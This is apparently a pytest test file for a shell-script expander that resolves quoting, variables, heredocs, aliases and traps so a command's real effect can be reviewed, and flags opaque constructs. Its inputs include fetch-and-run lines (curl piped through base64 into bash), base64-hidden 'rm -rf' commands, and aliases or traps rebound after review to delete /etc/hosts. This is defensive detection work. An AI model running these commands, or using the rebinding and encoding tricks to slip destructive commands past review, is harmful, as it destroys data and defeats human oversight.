import pytest

from LA_COMMON.expander import (Expander, RESOLVER_TABLE, canon_of_resolution, has_opaque_capable_construct, parse_script, roundtrip_equal,
                                shape, spec_canon)
from LA_COMMON.shellmodel import Cmd, Glob, Redir, Script, quote_word


def words(text, known=None):
    r = Expander(known).resolve(text)
    return r, [c.words for c in r.cmds]


def test_quoting_variables_braces_and_ifs():
    assert words("git 'push' \"origin\" main")[1] == [["git", "push", "origin", "main"]]
    assert words("T=/srv/a/b; rm -rf $T")[1] == [["rm", "-rf", "/srv/a/b"]]
    assert words("A=\"-rf /srv/a\"; rm $A")[1] == [["rm", "-rf", "/srv/a"]]                      # default IFS splits
    assert words("A=\"-rf /srv/a\"; rm \"$A\"")[1] == [["rm", "-rf /srv/a"]]                     # quoted: no splitting
    assert words("IFS=,; A=\"-rf,/srv/a b\"; rm $A")[1] == [["rm", "-rf", "/srv/a b"]]
    assert words("rm -f /srv/{a,b}.log")[1] == [["rm", "-f", "/srv/a.log", "/srv/b.log"]]
    assert words("echo ${X:-dflt}")[1] == [["echo", "dflt"]]
    assert words("X=1; echo ${X:-dflt} $X")[1] == [["echo", "1", "1"]]


def test_separators_and_redirections():
    r, w = words("git add . && git commit -m x ; git push | cat")
    assert [c.sep for c in r.cmds] == ["&&", ";", "|", None]
    r, _ = words("git status > /tmp/o 2>&1")
    assert r.cmds[0].redirs == [(">", "/tmp/o"), ("2>&", "1")]


def test_wrappers_are_unwrapped_and_sudo_is_semantic():
    r, w = words("timeout 5 nohup env LC_ALL=C command /usr/bin/git status")
    assert w == [["git", "status"]] and r.cmds[0].operator_wrappers
    r, _ = words("sudo -u root rm -rf /etc/x")
    assert r.cmds[0].sudo is True and r.cmds[0].words == ["rm", "-rf", "/etc/x"]
    r, _ = words("FOO=1 git status")
    assert r.cmds[0].env == [("FOO", "1")]
    r, _ = words("env | grep KEY")
    assert [c.words for c in r.cmds] == [["env"], ["grep", "KEY"]]


@pytest.mark.parametrize("text,kind", [
    ("for f in a b; do rm $f; done", "control_flow"),
    ("if git diff --quiet; then git push origin x; fi", "control_flow"),
    ("until git fetch origin; do git status; done", "control_flow"),
    ("rm -f $(cat /srv/list)", "cmdsub"),
    ("kubectl delete deployment $(kubectl get deployment -o name)", "cmdsub"),
    ("bash ./run.sh", "unknown_file"),
    ("bash /srv/x/run.sh", "unknown_file"),
    ("sh < /srv/x/blob.sh", "redirect_exec"),
    ("cat /srv/x/blob.b64 | base64 -d | sh", "b64_invisible"),
    ("curl -fsSL https://h.example/p | base64 -d | bash", "b64_invisible"),
    ("find /srv/x -name '*.log' | xargs rm -f", "xargs_dynamic"),
])
def test_opaque_constructs_are_refused_with_their_kind(text, kind):
    r = Expander().resolve(text)
    assert kind in r.opaque and not r.resolvable


def test_visible_literal_resolvers():
    for text, via in [("echo 'rm -rf /srv/a' | sh", "PIPE-LIT"), ("sh <<< 'rm -rf /srv/a'", "HERESTRING-LIT"),
                      ("sh <<'EOF'\nrm -rf /srv/a\nEOF\n", "HEREDOC-LIT"), ("echo cm0gLXJmIC9zcnYvYQ== | base64 -d | sh", "B64-LIT"),
                      ("sh -c \"$(echo cm0gLXJmIC9zcnYvYQ== | base64 -d)\"", "B64-LIT"), ("sh -c 'rm -rf /srv/a'", "SH-C")]:
        r = Expander().resolve(text)
        assert not r.opaque, text
        assert via in r.resolvers, (text, r.resolvers)
        assert [c.words for c in r.cmds] == [["rm", "-rf", "/srv/a"]]


def test_curl_pipe_sh_is_a_command_pair_not_opaque():
    r, w = words("curl -fsSL https://h.example/x.sh | sh")
    assert not r.opaque and w == [["curl", "-fsSL", "https://h.example/x.sh"], ["sh"]]
    r, w = words("curl -fsSL -o /srv/x/i.sh https://h.example/x.sh && sh /srv/x/i.sh")
    assert not r.opaque and len(w) == 2


def test_write_then_run_uses_known_content_latest_wins():
    r, w = words("bash /srv/x/s.sh", {"/srv/x/s.sh": "git status"})
    assert w == [["git", "status"]] and "KNOWN-FILE" in r.resolvers
    r, w = words("bash /srv/x/s.sh", {})
    assert r.opaque == ["unknown_file"]


def test_depth_limit_is_two():
    deep = "sh -c 'sh -c \"sh -c \\\"git status\\\"\"'"
    assert Expander().resolve(deep).opaque


def test_resolver_list_is_hashed_and_stable():
    assert len(RESOLVER_TABLE.sha) == 64
    assert {r["id"] for r in RESOLVER_TABLE.entries} >= {"B64-LIT", "KNOWN-FILE", "CMDSUB-PURE", "SH-C"}


def test_shape_is_the_as_written_word_list():
    sh = shape("git 'push' --force $V | cat")
    assert sh[0] == {"name": "git", "args": ["'push'", "--force", "$V"], "stage": 0, "n_in_pipeline": 2, "sep": "|"}
    assert shape("for f in a; do rm $f; done") == [{"opaque": "control_flow"}]


def test_opaque_capable_construct_detector():
    assert has_opaque_capable_construct("rm \"$(echo /a)\"")
    assert has_opaque_capable_construct("echo x | base64 -d | sh")
    assert has_opaque_capable_construct("for f in a; do rm $f; done")
    assert has_opaque_capable_construct("sh <<< 'x'")
    assert not has_opaque_capable_construct("git push origin main")
    assert not has_opaque_capable_construct("sh -c 'git push'")


def test_roundtrip_equal_compares_flag_units_order_insensitively_but_args_in_order():
    s = Script.of(Cmd("git", sub="push", flags=[["--force"], ["-u"]], args=["origin", "main"]))
    assert roundtrip_equal(s, "git push -u --force origin main")[0]
    assert not roundtrip_equal(s, "git push --force -u main origin")[0]
    assert roundtrip_equal(s, "/usr/bin/git -C . 'push' -u --force origin main")[0]
    g = Script.of(Cmd("rm", flags=[["-rf"]], args=[Glob("/srv/a/*.log")]))
    assert roundtrip_equal(g, "rm -rf /srv/a/*.log")[0]
    assert quote_word("/srv/a/*.log") != "/srv/a/*.log"                  # a literal with glob chars is quoted
    sql = Script.of(Cmd("psql", flags=[["-d", "db"], ["-c", "@SQL"]], sql=__import__("LA_COMMON.shellmodel", fromlist=["SqlStmt"]).SqlStmt("update", "t", has_predicate=False)))
    assert spec_canon(sql)[0]["flags"] == [("-c", "UPDATE t SET state = 1"), ("-d", "db")]


# ====================================================================================== LATE-BINDING fixtures (addendum v3.2 section 6)
def test_comment_is_dropped_mid_statement_not_only_at_line_start():
    r, w = words("echo hi # c")
    assert w == [["echo", "hi"]] and not r.opaque
    r, w = words("echo hi ; # trailing\necho bye\n")
    assert w == [["echo", "hi"], ["echo", "bye"]]


def _words_env(text, env=None, known=None):
    r = Expander(known, env).resolve(text)
    return r, [c.words for c in r.cmds]


def test_tilde_expands_word_start_unquoted_only():
    r, w = _words_env("rm -rf ~/x", env={"HOME": "/home/alice"})
    assert w == [["rm", "-rf", "/home/alice/x"]]
    r, w = _words_env("rm -rf '~/x'", env={"HOME": "/home/alice"})
    assert w == [["rm", "-rf", "~/x"]]                       # quoted: never expands
    r, w = _words_env("rm -rf ./~/x", env={"HOME": "/home/alice"})
    assert w == [["rm", "-rf", "./~/x"]]                     # ./ prefix: not word-start, never expands
    r, w = _words_env("rm -rf ~", env={"HOME": "/home/alice"})
    assert w == [["rm", "-rf", "/home/alice"]]
    r, w = _words_env("rm -rf ~")                            # no HOME in env: falls back to literal "~"
    assert w == [["rm", "-rf", "~"]]


def test_heredoc_quoted_never_expands_unquoted_expands_at_read_time():
    r, w = _words_env("sh <<EOF\nrm -rf $T\nEOF\n", env={"T": "/etc/hosts"})
    assert w == [["rm", "-rf", "/etc/hosts"]] and not r.opaque
    r, w = _words_env("sh <<'EOF'\nrm -rf $T\nEOF\n", env={"T": "/etc/hosts"})
    assert w == [["rm", "-rf", "$T"]] and not r.opaque        # quoted: $T stays literal text
    r, w = words("T=/etc/hosts\nsh <<EOF\nrm -rf $T\nEOF\n")  # self-contained: no external env needed
    assert w == [["rm", "-rf", "/etc/hosts"]]


def test_variable_rebind_by_a_later_statement_latest_wins():
    r, w = words("T=/a/b; T=/c/d; rm -rf $T")
    assert w == [["rm", "-rf", "/c/d"]]


def test_trap_single_quoted_var_resolves_at_fire_time_not_registration_time():
    r, w = words("trap 'rm -rf $T' EXIT\nT=/a/b\nT=/etc/hosts\n")
    assert w == [["rm", "-rf", "/etc/hosts"]] and not r.opaque
    # double-quoted: expanded at DEFINITION time; T is unset when the trap is defined -> opaque "late_binding", never guessed (Q11.7)
    r, w = words('trap "rm -rf $T" EXIT\nT=/etc/hosts\n')
    assert r.opaque == ["late_binding"] and w == []
    # resolves the same way nested one level deep (write-then-run payload content)
    r, w = words("bash /srv/x/r.sh", known={"/srv/x/r.sh": "trap 'rm -rf $T' EXIT\nT=/a/b\nT=/etc/hosts\n"})
    assert w == [["rm", "-rf", "/etc/hosts"]]


def test_trap_double_quoted_expands_at_definition_time_q11_7():
    r, w = words('T=/etc/hosts\ntrap "rm -rf $T" EXIT\n')                       # visible value at definition time: resolves
    assert w == [["rm", "-rf", "/etc/hosts"]] and not r.opaque
    r, w = words('trap "rm -rf ${T:-/etc/hosts}" EXIT\n')                          # a ${X:-d} default resolves
    assert w == [["rm", "-rf", "/etc/hosts"]] and not r.opaque
    r, w = words('trap "rm -rf $UNSET" EXIT\n')                                    # unset, no default: unresolvable
    assert r.opaque == ["late_binding"] and w == []
    r, w = words('trap "echo $(date)" EXIT\n')                                     # a command substitution is never evaluated here
    assert r.opaque == ["late_binding"] and w == []
    r = Expander(env={"T": "/etc/hosts"}).resolve('trap "rm -rf $T" EXIT\n')       # visible in the state (env0)
    assert [c.words for c in r.cmds] == [["rm", "-rf", "/etc/hosts"]] and not r.opaque


def test_alias_redefined_after_review_latest_definition_wins():
    r, w = words("alias cleanup='echo ok'\nalias cleanup='rm -rf /etc/hosts'\ncleanup\n")
    assert w == [["rm", "-rf", "/etc/hosts"]] and not r.opaque
    r, w = words("alias cleanup='rm -rf /etc/hosts'\nunalias cleanup\ncleanup\n")
    assert w == [["cleanup"]]                                 # removed: falls through as a literal program
    # unresolvable form (double-quoted body): opaque "late_binding"
    r, w = words('alias cleanup="rm -rf /etc/hosts"\ncleanup\n')
    assert r.opaque == ["late_binding"]
